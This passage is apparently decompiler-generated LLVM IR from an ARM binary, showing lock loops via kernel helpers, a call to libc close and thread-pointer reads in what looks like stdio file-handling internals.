  store i1 %v3_15fac118, i1* %cpsr_c.global-to-local, align 1
  %v9_15fac124 = icmp eq i32 %v2_15fa8116, %v0_15fa4
  br i1 %v9_15fac124, label %dec_label_pc_15fb4, label %dec_label_pc_15fcc

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15f98, %dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge
  %v0_15fb4125 = phi i32 [ %v1_15fac.pre, %dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge ], [ %v0_15fa4, %dec_label_pc_15f98 ]
  store i32 %v0_15fb4125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15fc4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15fc4, label %dec_label_pc_15fc8, label %dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge

dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge:  ; preds = %dec_label_pc_15fb4
  %v0_15fa8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15fac.pre = load i32, i32* @r4, align 4
  %v1_15fa8 = inttoptr i32 %v0_15fa8.pre to i32*
  %v2_15fa8 = load i32, i32* %v1_15fa8, align 4
  store i32 %v2_15fa8, i32* %r3.global-to-local, align 4
  %v3_15fac = icmp uge i32 %v2_15fa8, %v1_15fac.pre
  store i1 %v3_15fac, i1* %cpsr_c.global-to-local, align 1
  %v9_15fac = icmp eq i32 %v2_15fa8, %v1_15fac.pre
  br i1 %v9_15fac, label %dec_label_pc_15fb4, label %dec_label_pc_15fcc

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15fb4
  %v0_15fc8 = load i32, i32* @r4, align 4
  store i32 %v0_15fc8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15fcc

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15f98, %dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge, %dec_label_pc_15fc8
  %v0_15fcc = phi i32 [ %v0_15fc8, %dec_label_pc_15fc8 ], [ %v2_15fa8116, %dec_label_pc_15f98 ], [ %v2_15fa8, %dec_label_pc_15fb4.dec_label_pc_15fa8_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15fcc = icmp eq i32 %v0_15fcc, 0
  br i1 %v2_15fcc, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_15fcc
  %v1_15fd0 = load i32, i32* @r7, align 4
  store i32 %v1_15fd0, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_15fcc, %bb
  %v1_15fd4 = xor i1 %v2_15fcc, true
  call void @__pseudo_cond_branch(i1 %v1_15fd4, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_15fd8 = load i32, i32* @r6, align 4
  %v1_15fd8 = load i32, i32* @r5, align 4
  %v2_15fd8 = add i32 %v1_15fd8, 64
  %v3_15fd8 = inttoptr i32 %v2_15fd8 to i32*
  store i32 %v0_15fd8, i32* %v3_15fd8, align 4
  %v0_15fdc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15fdc

dec_label_pc_15fdc:                               ; preds = %dec_label_pc_15f84, %bb41
  %v0_15fdc = phi i32 [ %v0_15f88, %dec_label_pc_15f84 ], [ %v0_15fdc.pre, %bb41 ]
  %v1_15fdc = add i32 %v0_15fdc, 60
  %v2_15fdc = inttoptr i32 %v1_15fdc to i32*
  %v3_15fdc = load i32, i32* %v2_15fdc, align 4
  %v1_15fe0 = add i32 %v3_15fdc, 1
  store i32 %v1_15fe0, i32* %r3.global-to-local, align 4
  store i32 %v1_15fe0, i32* %v2_15fdc, align 4
  %v0_15fe8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15fe8

dec_label_pc_15fe8:                               ; preds = %entry, %dec_label_pc_15fdc
  %v1_15ff0 = phi i32 [ %tmp, %entry ], [ %v0_15fe8.pre, %dec_label_pc_15fdc ]
  %v1_15fe8 = inttoptr i32 %v1_15ff0 to i16*
  %v2_15fe8 = load i16, i16* %v1_15fe8, align 2
  %v3_15fe8 = zext i16 %v2_15fe8 to i32
  store i32 %v3_15fe8, i32* %r3.global-to-local, align 4
  %v1_15fec = and i32 %v3_15fe8, 64
  %v2_15fec = icmp eq i32 %v1_15fec, 0
  br i1 %v2_15fec, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_15fe8
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_15fe8, %bb42
  %storemerge = phi i32 [ %v1_15ff0, %bb42 ], [ %v1_15fec, %dec_label_pc_15fe8 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 90104, i32* @lr, align 4
  %v1_15ff4 = xor i1 %v2_15fec, true
  call void @__pseudo_cond_branch(i1 %v1_15ff4, i32 ptrtoint (i32* @global_var_16e38.619 to i32))
  %v0_15ff8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15ff8, i32* %fp.global-to-local, align 4
  %v0_15ffc = load i32, i32* @r5, align 4
  %v1_15ffc = add i32 %v0_15ffc, 4
  %v2_15ffc = inttoptr i32 %v1_15ffc to i32*
  %v3_15ffc = load i32, i32* %v2_15ffc, align 4
  store i32 %v3_15ffc, i32* %r0.global-to-local, align 4
  %v1_16000 = call i32 @__GI___libc_close(i32 %v3_15ffc)
  store i32 %v1_16000, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16008 = load i32, i32* @r8, align 4
  %v2_16008 = add i32 %v0_16008, 160
  %v3_16008 = inttoptr i32 %v2_16008 to i32*
  %v4_16008 = load i32, i32* %v3_16008, align 4
  store i32 %v4_16008, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1600c = icmp slt i32 %v1_16000, 0
  br i1 %v1_1600c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_16014 = add i32 %v4_16008, 8
  %v2_16014 = inttoptr i32 %v1_16014 to i32*
  %v3_16014 = load i32, i32* %v2_16014, align 4
  store i32 %v3_16014, i32* %r3.global-to-local, align 4
  %v0_16018 = call i32 @__aeabi_read_tp()
  store i32 %v0_16018, i32* %r0.global-to-local, align 4
  %v1_1601c = add i32 %v0_16018, -1168
  store i32 %v1_1601c, i32* %sl.global-to-local, align 4
  %v0_16020 = load i32, i32* %r3.global-to-local, align 4
  %v3_16020 = icmp uge i32 %v0_16020, %v1_1601c
  store i1 %v3_16020, i1* %cpsr_c.global-to-local, align 1
  %v9_16020 = icmp eq i32 %v0_16020, %v1_1601c
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_16028 = load i32, i32* @r5, align 4
  %v2_16028 = add i32 %v1_16028, 4
  %v3_16028 = inttoptr i32 %v2_16028 to i32*
  store i32 -1, i32* %v3_16028, align 4
  br i1 %v9_16020, label %dec_label_pc_16070, label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %bb45
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_16034 = load i32, i32* @r7, align 4
  store i32 %v0_16034, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1603c108 = inttoptr i32 %v0_16034 to i32*
  %v2_1603c109 = load i32, i32* %v1_1603c108, align 4
  store i32 %v2_1603c109, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16040111 = icmp eq i32 %v2_1603c109, 0
  br i1 %v9_16040111, label %dec_label_pc_16048, label %dec_label_pc_16060

dec_label_pc_16048:                               ; preds = %dec_label_pc_16030, %dec_label_pc_16048.dec_label_pc_1603c_crit_edge
  %v0_16048112 = phi i32 [ %v1_16040.pre, %dec_label_pc_16048.dec_label_pc_1603c_crit_edge ], [ 0, %dec_label_pc_16030 ]
  store i32 %v0_16048112, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16058 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16058, label %dec_label_pc_1605c, label %dec_label_pc_16048.dec_label_pc_1603c_crit_edge

dec_label_pc_16048.dec_label_pc_1603c_crit_edge:  ; preds = %dec_label_pc_16048
  %v0_1603c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16040.pre = load i32, i32* @r4, align 4
  %v1_1603c = inttoptr i32 %v0_1603c.pre to i32*
  %v2_1603c = load i32, i32* %v1_1603c, align 4
  store i32 %v2_1603c, i32* %r3.global-to-local, align 4
  %v3_16040 = icmp uge i32 %v2_1603c, %v1_16040.pre
  store i1 %v3_16040, i1* %cpsr_c.global-to-local, align 1
  %v9_16040 = icmp eq i32 %v2_1603c, %v1_16040.pre
  br i1 %v9_16040, label %dec_label_pc_16048, label %dec_label_pc_16060

dec_label_pc_1605c:                               ; preds = %dec_label_pc_16048
  %v0_1605c = load i32, i32* @r4, align 4
  store i32 %v0_1605c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16060

dec_label_pc_16060:                               ; preds = %dec_label_pc_16030, %dec_label_pc_16048.dec_label_pc_1603c_crit_edge, %dec_label_pc_1605c
  %v0_16060 = phi i32 [ %v0_1605c, %dec_label_pc_1605c ], [ %v2_1603c109, %dec_label_pc_16030 ], [ %v2_1603c, %dec_label_pc_16048.dec_label_pc_1603c_crit_edge ]
  %v1_16060 = phi i32 [ %v0_1605c, %dec_label_pc_1605c ], [ 0, %dec_label_pc_16030 ], [ %v1_16040.pre, %dec_label_pc_16048.dec_label_pc_1603c_crit_edge ]
  %v3_16060 = icmp uge i32 %v0_16060, %v1_16060
  store i1 %v3_16060, i1* %cpsr_c.global-to-local, align 1
  %v9_16060 = icmp eq i32 %v0_16060, %v1_16060
  br i1 %v9_16060, label %bb47, label %bb46

bb46:                                             ; preds = %dec_label_pc_16060
  %v1_16064 = load i32, i32* @r7, align 4
  store i32 %v1_16064, i32* %r0.global-to-local, align 4
  br label %bb47

bb47:                                             ; preds = %dec_label_pc_16060, %bb46
  %v1_16068 = xor i1 %v9_16060, true
  call void @__pseudo_cond_branch(i1 %v1_16068, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_1606c = load i32, i32* %sl.global-to-local, align 4
  %v1_1606c = load i32, i32* @r7, align 4
  %v2_1606c = add i32 %v1_1606c, 8
  %v3_1606c = inttoptr i32 %v2_1606c to i32*
  store i32 %v0_1606c, i32* %v3_1606c, align 4
  br label %dec_label_pc_16070

dec_label_pc_16070:                               ; preds = %bb45, %bb47
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16074 = load i32, i32* @r8, align 4
  %v2_16074 = add i32 %v0_16074, 160
  %v3_16074 = inttoptr i32 %v2_16074 to i32*
  %v4_16074 = load i32, i32* %v3_16074, align 4
  store i32 %v4_16074, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_1607c = add i32 %v0_16074, 12
  %v3_1607c = inttoptr i32 %v2_1607c to i32*
  %v4_1607c = load i32, i32* %v3_1607c, align 4
  store i32 %v4_1607c, i32* %r2.global-to-local, align 4
  %v1_16080 = add i32 %v4_16074, 4
  %v2_16080 = inttoptr i32 %v1_16080 to i32*
  %v3_16080 = load i32, i32* %v2_16080, align 4
  store i32 %v3_16080, i32* %r1.global-to-local, align 4
  %v1_16084 = inttoptr i32 %v4_1607c to i32*
  %v2_16084 = load i32, i32* %v1_16084, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16088 = icmp eq i32 %v3_16080, 0
  %v1_1608c = add i32 %v2_16084, 1
  store i32 %v1_1608c, i32* %r3.global-to-local, align 4
  store i32 %v1_1608c, i32* %v1_16084, align 4
  br i1 %v2_16088, label %dec_label_pc_16098, label %dec_label_pc_160f8

dec_label_pc_16098:                               ; preds = %dec_label_pc_16070
  %v0_16098 = load i32, i32* %r1.global-to-local, align 4
  %v1_16098 = load i32, i32* %r0.global-to-local, align 4
  %v2_16098 = add i32 %v1_16098, 8
  %v3_16098 = inttoptr i32 %v2_16098 to i32*
  store i32 %v0_16098, i32* %v3_16098, align 4
  %v0_1609c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1609c, i32* @r7, align 4
  br label %dec_label_pc_160a0

dec_label_pc_160a0:                               ; preds = %dec_label_pc_160d0.dec_label_pc_160a0_crit_edge, %dec_label_pc_16098
  %v0_160a0 = phi i32 [ %v0_160a0.pre, %dec_label_pc_160d0.dec_label_pc_160a0_crit_edge ], [ %v0_1609c, %dec_label_pc_16098 ]
  %v1_160a0 = inttoptr i32 %v0_160a0 to i32*
  %v2_160a0 = load i32, i32* %v1_160a0, align 4
  store i32 %v2_160a0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_160a0, i32* %r2.global-to-local, align 4
  %v2_160ac96 = load i32, i32* %v1_160a0, align 4
  store i32 %v2_160ac96, i32* %r3.global-to-local, align 4
  %v3_160b098 = icmp uge i32 %v2_160ac96, %v2_160a0
  store i1 %v3_160b098, i1* %cpsr_c.global-to-local, align 1
  %v9_160b0104 = icmp eq i32 %v2_160ac96, %v2_160a0
  br i1 %v9_160b0104, label %dec_label_pc_160b8, label %dec_label_pc_160d0

dec_label_pc_160b8:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge
  %v0_160b8105 = phi i32 [ %v1_160b0.pre, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ], [ %v2_160a0, %dec_label_pc_160a0 ]
  store i32 %v0_160b8105, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_160c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_160c8, label %dec_label_pc_160cc, label %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge

dec_label_pc_160b8.dec_label_pc_160ac_crit_edge:  ; preds = %dec_label_pc_160b8
  %v0_160ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_160b0.pre = load i32, i32* @r4, align 4
  %v1_160ac = inttoptr i32 %v0_160ac.pre to i32*
  %v2_160ac = load i32, i32* %v1_160ac, align 4
  store i32 %v2_160ac, i32* %r3.global-to-local, align 4
  %v3_160b0 = icmp uge i32 %v2_160ac, %v1_160b0.pre
  store i1 %v3_160b0, i1* %cpsr_c.global-to-local, align 1
  %v9_160b0 = icmp eq i32 %v2_160ac, %v1_160b0.pre
  br i1 %v9_160b0, label %dec_label_pc_160b8, label %dec_label_pc_160d0

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b8
  %v0_160cc = load i32, i32* @r4, align 4
  store i32 %v0_160cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160d0

dec_label_pc_160d0:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge, %dec_label_pc_160cc
  %v0_160d8 = phi i32 [ %v0_160cc, %dec_label_pc_160cc ], [ %v2_160ac96, %dec_label_pc_160a0 ], [ %v2_160ac, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ]
  %v1_160d0 = phi i32 [ %v0_160cc, %dec_label_pc_160cc ], [ %v2_160a0, %dec_label_pc_160a0 ], [ %v1_160b0.pre, %dec_label_pc_160b8.dec_label_pc_160ac_crit_edge ]
  %v3_160d0 = icmp uge i32 %v0_160d8, %v1_160d0
  store i1 %v3_160d0, i1* %cpsr_c.global-to-local, align 1
  %v9_160d0 = icmp eq i32 %v0_160d8, %v1_160d0
  br i1 %v9_160d0, label %dec_label_pc_160d8, label %dec_label_pc_160d0.dec_label_pc_160a0_crit_edge

dec_label_pc_160d0.dec_label_pc_160a0_crit_edge:  ; preds = %dec_label_pc_160d0
  %v0_160a0.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_160a0

dec_label_pc_160d8:                               ; preds = %dec_label_pc_160d0
  %v2_160d8 = icmp ne i32 %v1_160d0, 0
  store i1 %v2_160d8, i1* %cpsr_c.global-to-local, align 1
  %v7_160dc = icmp slt i32 %v1_160d0, 2
  br i1 %v7_160dc, label %dec_label_pc_160f8, label %dec_label_pc_160e0

dec_label_pc_160e0:                               ; preds = %dec_label_pc_160d8
  %v0_160e0 = load i32, i32* @r7, align 4
  store i32 %v0_160e0, i32* %r0.global-to-local, align 4
  %v0_160e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_160e4 = add i32 %v0_160e4, 129
  store i32 %v1_160e4, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_160f8

dec_label_pc_160f8:                               ; preds = %dec_label_pc_16070, %dec_label_pc_160e0, %dec_label_pc_160d8
  %v0_160f8 = load i32, i32* @r5, align 4
  %v1_160f8 = inttoptr i32 %v0_160f8 to i16*
  %v2_160f8 = load i16, i16* %v1_160f8, align 2
  %v3_160f8 = zext i16 %v2_160f8 to i32
  %v1_160fc = and i32 %v3_160f8, 24576
  %v1_16100 = or i32 %v1_160fc, 48
  store i32 %v1_16100, i32* %r3.global-to-local, align 4
  %v0_16104 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16104 = icmp eq i32 %v0_16104, 0
  %v1_16108 = trunc i32 %v1_16100 to i16
  store i16 %v1_16108, i16* %v1_160f8, align 2
  br i1 %v2_16104, label %dec_label_pc_16110, label %dec_label_pc_16184

dec_label_pc_16110:                               ; preds = %dec_label_pc_160f8
  %v0_16110 = load i32, i32* @r5, align 4
  %v1_16110 = add i32 %v0_16110, 60
  %v2_16110 = inttoptr i32 %v1_16110 to i32*
  %v3_16110 = load i32, i32* %v2_16110, align 4
  %v1_16114 = add i32 %v3_16110, -1
  store i32 %v1_16114, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16118 = icmp eq i32 %v1_16114, 0
  store i32 %v1_16114, i32* %v2_16110, align 4
  br i1 %v2_16118, label %dec_label_pc_16124, label %dec_label_pc_16184

dec_label_pc_16124:                               ; preds = %dec_label_pc_16110
  %v0_16124 = load i32, i32* %r3.global-to-local, align 4
  %v1_16124 = load i32, i32* @r5, align 4
  %v2_16124 = add i32 %v1_16124, 64
  %v3_16124 = inttoptr i32 %v2_16124 to i32*
  store i32 %v0_16124, i32* %v3_16124, align 4
  %v0_16128 = load i32, i32* @r5, align 4
  %v1_16128 = add i32 %v0_16128, 56
  store i32 %v1_16128, i32* @r6, align 4
  br label %dec_label_pc_1612c

dec_label_pc_1612c:                               ; preds = %dec_label_pc_1615c.dec_label_pc_1612c_crit_edge, %dec_label_pc_16124
  %v0_16134 = phi i32 [ %v0_16134.pre, %dec_label_pc_1615c.dec_label_pc_1612c_crit_edge ], [ %v1_16128, %dec_label_pc_16124 ]
  %v0_1612c = phi i32 [ %v0_1612c.pre, %dec_label_pc_1615c.dec_label_pc_1612c_crit_edge ], [ %v0_16128, %dec_label_pc_16124 ]
  %v1_1612c = add i32 %v0_1612c, 56
  %v2_1612c = inttoptr i32 %v1_1612c to i32*
  %v3_1612c = load i32, i32* %v2_1612c, align 4
  store i32 %v3_1612c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16134, i32* %r2.global-to-local, align 4
  %v1_1613882 = inttoptr i32 %v0_16134 to i32*
  %v2_1613883 = load i32, i32* %v1_1613882, align 4
  store i32 %v2_1613883, i32* %r3.global-to-local, align 4
  %v3_1613c85 = icmp uge i32 %v2_1613883, %v3_1612c
  store i1 %v3_1613c85, i1* %cpsr_c.global-to-local, align 1
  %v9_1613c91 = icmp eq i32 %v2_1613883, %v3_1612c
  br i1 %v9_1613c91, label %dec_label_pc_16144, label %dec_label_pc_1615c

dec_label_pc_16144:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_16144.dec_label_pc_16138_crit_edge
  %v0_1614492 = phi i32 [ %v1_1613c.pre, %dec_label_pc_16144.dec_label_pc_16138_crit_edge ], [ %v3_1612c, %dec_label_pc_1612c ]
  store i32 %v0_1614492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16154 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16154, label %dec_label_pc_16158, label %dec_label_pc_16144.dec_label_pc_16138_crit_edge

dec_label_pc_16144.dec_label_pc_16138_crit_edge:  ; preds = %dec_label_pc_16144
  %v0_16138.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1613c.pre = load i32, i32* @r4, align 4
  %v1_16138 = inttoptr i32 %v0_16138.pre to i32*
  %v2_16138 = load i32, i32* %v1_16138, align 4
  store i32 %v2_16138, i32* %r3.global-to-local, align 4
  %v3_1613c = icmp uge i32 %v2_16138, %v1_1613c.pre
  store i1 %v3_1613c, i1* %cpsr_c.global-to-local, align 1
  %v9_1613c = icmp eq i32 %v2_16138, %v1_1613c.pre
  br i1 %v9_1613c, label %dec_label_pc_16144, label %dec_label_pc_1615c

dec_label_pc_16158:                               ; preds = %dec_label_pc_16144
  %v0_16158 = load i32, i32* @r4, align 4
  store i32 %v0_16158, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1615c

dec_label_pc_1615c:                               ; preds = %dec_label_pc_1612c, %dec_label_pc_16144.dec_label_pc_16138_crit_edge, %dec_label_pc_16158
  %v0_16164 = phi i32 [ %v0_16158, %dec_label_pc_16158 ], [ %v2_1613883, %dec_label_pc_1612c ], [ %v2_16138, %dec_label_pc_16144.dec_label_pc_16138_crit_edge ]
  %v1_1615c = phi i32 [ %v0_16158, %dec_label_pc_16158 ], [ %v3_1612c, %dec_label_pc_1612c ], [ %v1_1613c.pre, %dec_label_pc_16144.dec_label_pc_16138_crit_edge ]
  %v3_1615c = icmp uge i32 %v0_16164, %v1_1615c
  store i1 %v3_1615c, i1* %cpsr_c.global-to-local, align 1
  %v9_1615c = icmp eq i32 %v0_16164, %v1_1615c
  br i1 %v9_1615c, label %dec_label_pc_16164, label %dec_label_pc_1615c.dec_label_pc_1612c_crit_edge

dec_label_pc_1615c.dec_label_pc_1612c_crit_edge:  ; preds = %dec_label_pc_1615c
  %v0_1612c.pre = load i32, i32* @r5, align 4
  %v0_16134.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1612c

dec_label_pc_16164:                               ; preds = %dec_label_pc_1615c
  %v2_16164 = icmp ne i32 %v1_1615c, 0
  store i1 %v2_16164, i1* %cpsr_c.global-to-local, align 1
  %v7_16168 = icmp slt i32 %v1_1615c, 2
  br i1 %v7_16168, label %dec_label_pc_16184, label %dec_label_pc_1616c

dec_label_pc_1616c:                               ; preds = %dec_label_pc_16164
  %v0_1616c = load i32, i32* @r5, align 4
  %v1_1616c = add i32 %v0_1616c, 56
  store i32 %v1_1616c, i32* %r0.global-to-local, align 4
  %v0_16170 = load i32, i32* %r1.global-to-local, align 4
  %v1_16170 = add i32 %v0_16170, 129
  store i32 %v1_16170, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16184

dec_label_pc_16184:                               ; preds = %dec_label_pc_16110, %dec_label_pc_160f8, %dec_label_pc_1616c, %dec_label_pc_16164
  %v0_16184 = load i32, i32* @r5, align 4
  %v1_16184 = inttoptr i32 %v0_16184 to i16*
  %v2_16184 = load i16, i16* %v1_16184, align 2
  %v3_16184 = zext i16 %v2_16184 to i32
  store i32 %v3_16184, i32* %r3.global-to-local, align 4
  %v1_16188 = and i32 %v3_16184, 16384
  %v2_16188 = icmp eq i32 %v1_16188, 0
  br i1 %v2_16188, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_16184
  %v2_1618c = add i32 %v0_16184, 8
  %v3_1618c = inttoptr i32 %v2_1618c to i32*
  %v4_1618c = load i32, i32* %v3_1618c, align 4
  store i32 %v4_1618c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_16184, %bb48
  %v1_16190 = xor i1 %v2_16188, true
  call void @__pseudo_cond_branch(i1 %v1_16190, i32 ptrtoint (i32* @global_var_135dc.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_16198 = load i32, i32* @r8, align 4
  %v2_16198 = add i32 %v0_16198, 160
  %v3_16198 = inttoptr i32 %v2_16198 to i32*
  %v4_16198 = load i32, i32* %v3_16198, align 4
  store i32 %v4_16198, i32* @r5, align 4
  %v1_1619c = add i32 %v4_16198, 8
  %v2_1619c = inttoptr i32 %v1_1619c to i32*
  %v3_1619c = load i32, i32* %v2_1619c, align 4
  store i32 %v3_1619c, i32* %r3.global-to-local, align 4
  %v1_161a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_161a0 = icmp uge i32 %v3_1619c, %v1_161a0
  store i1 %v3_161a0, i1* %cpsr_c.global-to-local, align 1
  %v9_161a0 = icmp eq i32 %v3_1619c, %v1_161a0
  br i1 %v9_161a0, label %dec_label_pc_161e8, label %dec_label_pc_161a8

dec_label_pc_161a8:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_16198, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_161b475 = inttoptr i32 %v4_16198 to i32*
  %v2_161b476 = load i32, i32* %v1_161b475, align 4
  store i32 %v2_161b476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_161b878 = icmp eq i32 %v2_161b476, 0
  br i1 %v9_161b878, label %dec_label_pc_161c0, label %dec_label_pc_161d8

dec_label_pc_161c0:                               ; preds = %dec_label_pc_161a8, %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge
  %v0_161c079 = phi i32 [ %v1_161b8.pre, %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge ], [ 0, %dec_label_pc_161a8 ]
  store i32 %v0_161c079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161d0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161d0, label %dec_label_pc_161d4, label %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge

dec_label_pc_161c0.dec_label_pc_161b4_crit_edge:  ; preds = %dec_label_pc_161c0
  %v0_161b4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161b8.pre = load i32, i32* @r4, align 4
  %v1_161b4 = inttoptr i32 %v0_161b4.pre to i32*
  %v2_161b4 = load i32, i32* %v1_161b4, align 4
  store i32 %v2_161b4, i32* %r3.global-to-local, align 4
  %v3_161b8 = icmp uge i32 %v2_161b4, %v1_161b8.pre
  store i1 %v3_161b8, i1* %cpsr_c.global-to-local, align 1
  %v9_161b8 = icmp eq i32 %v2_161b4, %v1_161b8.pre
  br i1 %v9_161b8, label %dec_label_pc_161c0, label %dec_label_pc_161d8

dec_label_pc_161d4:                               ; preds = %dec_label_pc_161c0
  %v0_161d4 = load i32, i32* @r4, align 4
  store i32 %v0_161d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161d8

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161a8, %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge, %dec_label_pc_161d4
  %v0_161d8 = phi i32 [ %v0_161d4, %dec_label_pc_161d4 ], [ %v2_161b476, %dec_label_pc_161a8 ], [ %v2_161b4, %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge ]
  %v1_161d8 = phi i32 [ %v0_161d4, %dec_label_pc_161d4 ], [ 0, %dec_label_pc_161a8 ], [ %v1_161b8.pre, %dec_label_pc_161c0.dec_label_pc_161b4_crit_edge ]
  %v3_161d8 = icmp uge i32 %v0_161d8, %v1_161d8
  store i1 %v3_161d8, i1* %cpsr_c.global-to-local, align 1
  %v9_161d8 = icmp eq i32 %v0_161d8, %v1_161d8
  br i1 %v9_161d8, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_161d8
  %v1_161dc = load i32, i32* @r5, align 4
  store i32 %v1_161dc, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_161d8, %bb50
  %v1_161e0 = xor i1 %v9_161d8, true
  call void @__pseudo_cond_branch(i1 %v1_161e0, i32 ptrtoint (i32* @global_var_14794.527 to i32))
  %v0_161e4 = load i32, i32* %sl.global-to-local, align 4
  %v1_161e4 = load i32, i32* @r5, align 4
  %v2_161e4 = add i32 %v1_161e4, 8
  %v3_161e4 = inttoptr i32 %v2_161e4 to i32*
  store i32 %v0_161e4, i32* %v3_161e4, align 4
  %v0_161ec.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %bb49, %bb51
  %v0_161ec = phi i32 [ %v0_16198, %bb49 ], [ %v0_161ec.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_161ec = add i32 %v0_161ec, 80
  %v3_161ec = inttoptr i32 %v2_161ec to i32*
  %v4_161ec = load i32, i32* %v3_161ec, align 4
  store i32 %v4_161ec, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_161f4 = add i32 %v0_161ec, 160
  %v3_161f4 = inttoptr i32 %v2_161f4 to i32*
  %v4_161f4 = load i32, i32* %v3_161f4, align 4
  store i32 %v4_161f4, i32* %r0.global-to-local, align 4
  %v1_161f8 = inttoptr i32 %v4_161ec to i32*
  %v2_161f8 = load i32, i32* %v1_161f8, align 4
  store i32 %v2_161f8, i32* %r3.global-to-local, align 4
